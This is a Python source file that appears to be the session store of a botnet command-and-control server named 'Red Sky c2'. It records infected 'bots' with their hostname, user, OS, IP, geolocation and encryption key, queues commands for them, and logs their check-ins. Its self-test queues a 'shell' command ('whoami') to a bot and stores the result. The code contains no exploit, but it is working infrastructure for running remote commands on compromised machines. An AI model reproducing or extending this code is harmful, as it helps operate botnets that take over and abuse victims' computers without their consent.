# language: Python, file: Program/c2/session.py, target: Red Sky c2 — session store
# SQLite-backed bot registry, task queue, and event log. Read by the panel.

import json
import sqlite3
import threading
import time
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional

from Program.utils.paths import DATA_DIR


DB_PATH = DATA_DIR / "botnet.sqlite"


SCHEMA = """
CREATE TABLE IF NOT EXISTS bots (
    id          TEXT PRIMARY KEY,
    hostname    TEXT,
    user        TEXT,
    os          TEXT,
    arch        TEXT,
    pid         INTEGER,
    ip          TEXT,
    geo         TEXT,
    aes_key_hex TEXT NOT NULL,
    first_seen  INTEGER NOT NULL,
    last_seen   INTEGER NOT NULL,
    status      TEXT NOT NULL DEFAULT 'alive'
);
CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen);

CREATE TABLE IF NOT EXISTS tasks (
    id          TEXT PRIMARY KEY,
    bot_id      TEXT NOT NULL,
    command     TEXT NOT NULL,
    args        TEXT,
    created     INTEGER NOT NULL,
    sent        INTEGER,
    completed   INTEGER,
    output      TEXT,
    status      TEXT NOT NULL DEFAULT 'queued'
);
CREATE INDEX IF NOT EXISTS idx_tasks_bot ON tasks(bot_id, status);

CREATE TABLE IF NOT EXISTS events (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    bot_id  TEXT,
    ts      INTEGER NOT NULL,
    kind    TEXT NOT NULL,
    data    TEXT
);
CREATE INDEX IF NOT EXISTS idx_events_ts ON events(ts);
"""


class SessionStore:
    def __init__(self, path: Path = None):
        self.path = path or DB_PATH
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()
        self._conn = sqlite3.connect(str(self.path), check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._conn.executescript(SCHEMA)
        self._conn.commit()

    # ── bots ──
    def register_bot(self, bot_id: str, aes_key_hex: str, info: Dict) -> None:
        now = int(time.time())
        with self._lock:
            self._conn.execute("""
                INSERT INTO bots (id, hostname, user, os, arch, pid, ip, geo,
                                  aes_key_hex, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'alive')
                ON CONFLICT(id) DO UPDATE SET
                    hostname=excluded.hostname,
                    user=excluded.user,
                    os=excluded.os,
                    arch=excluded.arch,
                    pid=excluded.pid,
                    ip=excluded.ip,
                    geo=excluded.geo,
                    last_seen=excluded.last_seen,
                    status='alive'
            """, (
                bot_id,
                info.get("hostname", ""),
                info.get("user", ""),
                info.get("os", ""),
                info.get("arch", ""),
                info.get("pid", 0),
                info.get("ip", ""),
                json.dumps(info.get("geo", {})),
                aes_key_hex,
                now, now,
            ))
            self._conn.commit()

    def touch_bot(self, bot_id: str, ip: str = "") -> None:
        with self._lock:
            if ip:
                self._conn.execute("UPDATE bots SET last_seen=?, ip=? WHERE id=?",
                                   (int(time.time()), ip, bot_id))
            else:
                self._conn.execute("UPDATE bots SET last_seen=? WHERE id=?",
                                   (int(time.time()), bot_id))
            self._conn.commit()

    def get_bot(self, bot_id: str) -> Optional[Dict]:
        with self._lock:
            r = self._conn.execute("SELECT * FROM bots WHERE id=?", (bot_id,)).fetchone()
        return dict(r) if r else None

    def list_bots(self, alive_within: int = 300) -> List[Dict]:
        cutoff = int(time.time()) - alive_within
        with self._lock:
            rows = self._conn.execute("""
                SELECT * FROM bots
                ORDER BY (last_seen > ?) DESC, last_seen DESC
            """, (cutoff,)).fetchall()
        return [dict(r) for r in rows]

    def mark_dead(self, older_than: int = 3600) -> int:
        cutoff = int(time.time()) - older_than
        with self._lock:
            cur = self._conn.execute(
                "UPDATE bots SET status='dead' WHERE last_seen < ?", (cutoff,))
            self._conn.commit()
            return cur.rowcount

    # ── tasks ──
    def queue_task(self, bot_id: str, command: str, args: Dict = None) -> str:
        tid = str(uuid.uuid4())
        with self._lock:
            self._conn.execute("""
                INSERT INTO tasks (id, bot_id, command, args, created, status)
                VALUES (?, ?, ?, ?, ?, 'queued')
            """, (tid, bot_id, command, json.dumps(args or {}), int(time.time())))
            self._conn.commit()
        return tid

    def pull_tasks(self, bot_id: str, limit: int = 10) -> List[Dict]:
        """Pop queued tasks for a bot, mark them sent."""
        with self._lock:
            rows = self._conn.execute("""
                SELECT * FROM tasks
                WHERE bot_id=? AND status='queued'
                ORDER BY created ASC LIMIT ?
            """, (bot_id, limit)).fetchall()
            ids = [r["id"] for r in rows]
            if ids:
                q = ",".join("?" * len(ids))
                self._conn.execute(
                    f"UPDATE tasks SET status='sent', sent=? WHERE id IN ({q})",
                    [int(time.time())] + ids)
                self._conn.commit()
        return [dict(r) for r in rows]

    def complete_task(self, task_id: str, output: str, ok: bool = True) -> None:
        with self._lock:
            self._conn.execute("""
                UPDATE tasks
                SET status=?, output=?, completed=?
                WHERE id=?
            """, ("done" if ok else "failed", output, int(time.time()), task_id))
            self._conn.commit()

    def list_tasks(self, bot_id: str = "", limit: int = 100) -> List[Dict]:
        with self._lock:
            if bot_id:
                rows = self._conn.execute(
                    "SELECT * FROM tasks WHERE bot_id=? ORDER BY created DESC LIMIT ?",
                    (bot_id, limit)).fetchall()
            else:
                rows = self._conn.execute(
                    "SELECT * FROM tasks ORDER BY created DESC LIMIT ?",
                    (limit,)).fetchall()
        return [dict(r) for r in rows]

    # ── events ──
    def log_event(self, bot_id: str, kind: str, data: Any) -> None:
        with self._lock:
            self._conn.execute("""
                INSERT INTO events (bot_id, ts, kind, data)
                VALUES (?, ?, ?, ?)
            """, (bot_id, int(time.time()), kind, json.dumps(data)))
            self._conn.commit()

    def recent_events(self, limit: int = 100) -> List[Dict]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM events ORDER BY ts DESC LIMIT ?", (limit,)
            ).fetchall()
        return [dict(r) for r in rows]

    # ── stats ──
    def stats(self) -> Dict:
        now = int(time.time())
        with self._lock:
            total = self._conn.execute("SELECT COUNT(*) FROM bots").fetchone()[0]
            alive = self._conn.execute(
                "SELECT COUNT(*) FROM bots WHERE last_seen > ?", (now - 300,)
            ).fetchone()[0]
            dead = self._conn.execute(
                "SELECT COUNT(*) FROM bots WHERE last_seen <= ?", (now - 300,)
            ).fetchone()[0]
            queued = self._conn.execute(
                "SELECT COUNT(*) FROM tasks WHERE status='queued'"
            ).fetchone()[0]
            done = self._conn.execute(
                "SELECT COUNT(*) FROM tasks WHERE status IN ('done','failed')"
            ).fetchone()[0]
        return {
            "bots_total": total,
            "bots_alive": alive,
            "bots_dead": dead,
            "tasks_queued": queued,
            "tasks_done": done,
        }

    def close(self):
        with self._lock:
            self._conn.close()


if __name__ == "__main__":
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        s = SessionStore(Path(d) / "test.sqlite")
        s.register_bot("bot1", "aa" * 32, {"hostname": "pc1", "os": "win11"})
        s.register_bot("bot2", "bb" * 32, {"hostname": "pc2", "os": "win10"})
        tid = s.queue_task("bot1", "shell", {"cmd": "whoami"})
        s.complete_task(tid, "desktop\\nono", True)
        s.log_event("bot1", "checkin", {"ip": "127.0.0.1"})
        print("stats:", s.stats())
        print("bots:", [b["hostname"] for b in s.list_bots()])
        print("tasks:", [t["command"] for t in s.list_tasks("bot1")])
        s.close()
        print("session store OK")
